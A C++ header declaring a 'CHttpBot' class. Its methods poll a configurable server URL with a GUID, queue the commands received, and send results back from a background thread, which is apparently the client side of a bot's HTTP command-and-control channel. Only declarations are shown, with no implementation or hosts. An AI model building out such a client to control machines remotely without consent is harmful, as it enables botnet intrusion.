
class CHttpBot
{
public:
	CHttpBot();
	void SetServerUrl(char *szServerUrl);
	void StartMessageHandling(void);
	void SetTimeout(int iTimeoutMilliseconds);
	bool GetCommandFromQueue(char *szCommandBuffer);
	void AddResultToSend(char *szResultData);

private:
	void AddGUID(char *szUrl);
	void AddRequestData(char *szUrl, char *szDataName, char *szData);
	void RequestDataFromServer(char *szUrl, char *szServerAnswer);
	void MessageHandler(void);
	static DWORD WINAPI MessageHandlerThreadProc(LPVOID lpCHttpBot);
	void ParseDataFromServer(char *szBuffer);
	bool GetLineFromBuffer(char *szBuffer, char *szLine);
	
	char szOriginalUrl[4096], szBuffer[4096], szUrl[4096], szCommands[MAX_COMMANDS_IN_QUEUE][512], szResults[MAX_RESULTS_IN_QUEUE][512];
	DWORD dwThreadId;
	int iTimeout;
	HANDLE hThread;

protected:

};